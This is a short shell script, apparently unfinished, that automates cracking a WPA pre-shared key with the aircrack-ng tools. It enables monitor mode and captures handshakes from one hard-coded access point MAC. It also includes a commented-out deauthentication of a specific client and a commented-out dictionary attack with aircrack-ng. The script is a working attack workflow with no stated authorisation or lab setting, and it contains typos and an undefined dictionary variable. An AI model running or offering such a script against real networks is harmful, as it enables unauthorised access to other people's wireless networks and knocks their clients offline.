#!/bin/sh


# 1.Start the wireless interface in monitor mode on the specific AP channel
# 2.Start airodump-ng on AP channel with filter for bssid to collect authentication handshake
# 3.Use aireplay-ng to deauthenticate the wireless client
# 4.Run aircrack-ng to crack the pre-shared key using the authentication handshake


# Note: when calling airmon-ng, use -c channel
# ank kill Network manager to disable channel hopping.

BSSID='54:E6:FC:BC:50:FE'

echo
echo "1. Stopping network cards and processes..."
sudo ifconfig wlan0 down  # or sudo airmon-ng stop wlan0

echo "   Setting maing card to Monitor mode..."
sudo airmon-ng start wlan0 2 check kill  # creates 'mon0' injection interface, target channel 2

# Execute
echo
echo "2. Capture]ing handshakes..."
sudo airodump-ng -c 2 --bssid "$BSSID" -w psk mon0  # is this correct?

echo
echo "3. (optional) Deautenticate client..."
#aireplay-ng -0 1 -a $BSSID -c 00:21:63:85:9b:d3 mon0  # -a == AP, -c == client

echo
echo "4. By now, a 4-way handshake has been recorded. Crack it..."
#aircrack-ng -w $DICT -b $BSSiD psk*.cap  # TODO: set suitable widct: -w

echo "Cleaning up the mess..."
sudo airmon-ng stop mon0
sudo ifconfig wlan0 up
